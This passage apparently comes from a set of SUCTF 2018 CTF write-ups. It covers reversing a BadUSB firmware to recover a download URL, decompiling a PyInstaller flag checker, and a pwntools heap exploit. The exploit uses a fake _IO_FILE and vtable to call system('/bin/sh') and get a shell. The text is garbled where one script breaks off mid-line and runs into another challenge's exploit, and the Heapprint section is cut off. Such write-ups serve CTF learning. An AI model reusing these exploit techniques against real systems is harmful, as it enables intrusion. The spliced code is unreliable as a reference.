###  RubberDucky[天枢][选手:Invicsfate]
badusb的题目，在HITB2018上的hex就是一道badusb的题目，这道题目同理，只是逻辑改变了，先hex2bin，arduino
micro板子使用的是atmega32u4，编译器是arduino avr，在逆向时我选择了atmega32_L，程序的大致功能就是运行rundll32
url.dll,0penURL xxxxxxxxxx，从一个url上获取数据，我们只要获得这串url即可，脚本如下：
    #!/usr/bin/env python2
    #-*- coding:utf-8 -*-    import string
    guess = [0x25,0x16,0x09,0x07,0x63,0x62,0x68,0x1B,0xf,0x4E,0x12,0x7,0x24,0x1b,0xb,0x61,0x1A,0x17,0x46,0x11,0x6,0x1,0x18,0x1f,0x39,0xd,0x25,0x1b,0x53,0x16,0x9,0x3,0x5F,0x24,0x36,0x30,0x44,0xd,0x14,0x41,0x60,0x08,0x20,0x28,0x36,0x39,0x18,0x37,0x2e,0x49,0x1e,0x01,0x06]
    cipher = 'MasterMeihasAlargeSecretGardenfortHeTeamSU,canUfindit'
    ans = ''
    for i in range(len(cipher)):
        tmp = chr((((guess[i]-i%10)&0xff)^ord(cipher[i])))
        ans += tmp
    print ans
得到[http://qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip。](http://qn-suctf.summershrimp.com/UzNjcmU3R2FSZGVO.zip%E3%80%82)
解压得到的程序是一个pyinstaller打包的程序，使用pyinstxtractor解包，得到其的pyc文件，pyc文件缺失文件头标志和时间戳，补上即可，时间戳可以随意，我是用自己编译pyc文件的时间戳，使用uncompyle2即可得到py文件如下：
    # 2018.05.27 18:53:29 ÖÐ¹ú±ê×¼Ê±¼ä
    #Embedded file name: RubberDucky.py
    import os
    import time
    print '#####   #     #                                                 #####                                     '
    print '#     # #     #     ####  ######  ####  #####  ###### #####    #     #   ##   #####  #####  ###### #    # '
    print '#       #     #    #      #      #    # #    # #        #      #        #  #  #    # #    # #      ##   # '
    print ' #####  #     #     ####  #####  #      #    # #####    #      #  #### #    # #    # #    # #####  # #  # '
    print '      # #     #         # #      #      #####  #        #      #     # ###### #####  #    # #      #  # # '
    print '#     # #     #    #    # #      #    # #   #  #        #      #     # #    # #   #  #    # #      #   ## '
    print ' #####   #####      ####  ######  ####  #    # ######   #       #####  #    # #    # #####  ###### #    # '
    introduction = 'Je suis la garde du jardin'
    question = 'Donnez-moi FLAG avant de pouvoir y aller'
    time.sleep(2)
    os.system('cls')
    print 'Garde:' + introduction
    time.sleep(2)
    print 'Garde:' + question
    time.sleep(2)
    flag = ''
    b = ''
    cipher = 'YVGQF|1mooH.hXk.SebfQU`^WL)J[\(`'
    flag = raw_input('You:')
    if len(flag) != 32:
        print 'It has 32 words'
        os.system('exit')
    for i in range(len(flag)):
        b += chr(ord(flag[i]) + ord(flag[i]) % 4 * 2 - i)
    if b == cipher:
        print 'Garde:' + 'Correct flag! Welcome my friend, Meizijiu Shifu appreciates your visiting here!'
    else:
        print 'Garde:' + 'Noooo!Stranger!!Get out!'
    +++ okay decompyling test.pyc 
    # decompiled 1 files: 1 okay, 0 failed, 0 verify failed
    # 2018.05.27 18:53:29
写解密脚本:
    #!/usr/bin/env python2
    #-*- coding:utf-8 -*-    
    import string
    table = string.printable
    cipher = 'YVGQF|1mooH.hXk.SebfQU`^WL)J[\(`'
    ans = ''
    for group in range(len(cipher)):
        for ch in table:
            tmp = ord(ch) + (ord(ch) % 4) * 2 - group
            if tmp >')
        p.sendline('1')
        p.recvuntil('Size:')
        p.sendline(str(l))
        p.recvuntil('Content:')
        p.sendline(content)
    p.recvuntil('Choice>>')
    p.sendline('3')
    p.recvuntil('(yes:1)')
    p.sendline('1')
    p.recvuntil('Choice>>')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline('0')
    p.recvuntil('Content:')
    addr=p.recvuntil('n')[:-1]
    addr=(u64(addr.ljust(8,'x00')))
    print hex(addr)
    libc_base = addr -3930968#3939160#- 3767128 #3939160
    print hex(libc_base)
    real_io_list=libc_base+libc.symbols['_IO_list_all']
    print hex(real_io_list)
    real_io_stdin_buf_base=libc_base+libc.symbols['_IO_2_1_stdin_']+0x40
    real_system=libc_base+libc.symbols['system']
    real_binsh=libc_base+next(libc.search('/bin/sh'),)#0x18AC40
    add(0x90-8,'a')
    raw_input('step1,press any key to continue')
    add(0x90-8,'a'*0x80+p64(0)+p64(0xee1))
    raw_input('step2,press any key to continue')
    add(0x1000-8,'b'*0x80+p64(0)+p64(0x61)+p64(0xddaa)+p64(real_io_list-0x10))
    raw_input('step3,press any key to continue')
        #do_one(io,0x90-8,'a'*0x10)
    fake_chunk='x00'*8+p64(0x61) 
    fake_chunk+=p64(0xddaa)+p64(real_io_list-0x10)
    fake_chunk+=p64(0xffffffffffffff)+p64(0x2)+p64(0)*2+p64( (real_binsh-0x64)/2 )
    fake_chunk=fake_chunk.ljust(0xa0,'x00')
    fake_chunk+=p64(real_system+0x420)
    fake_chunk=fake_chunk.ljust(0xc0,'x00')
    fake_chunk+=p64(1)
    vtable_addr=libc_base+0x3bc4c0#0x3BE4C0
    payload =fake_chunk
    payload += p64(0)
    payload += p64(0)
    payload += p64(vtable_addr)
    payload += p64(real_system)
    payload += p64(2)
    payload += p64(3)
    payload += p64(0)*3 # vtable
    payload += p64(real_system)
    add(0x90-8,'c'*0x80+payload )
    p.sendline('1')
    p.sendline('16')
    p.interactive()
###  Heapprint
I made two challenges for SUCTF this year. I got the ideas when I was
exploring linux pwn technique and I want to share them with others. Though the
logic of the challenges are extremely easy, the exploitation may be a little
hard. Since only two teams solved one of the challenge and nobody solved the
other, I decide to write a wp for them. If you like the writeup, follow me on
[github](https://github.com/Changochen) ^_^
This challenge is about format-string vuln. No leak. Trigger fmt once and get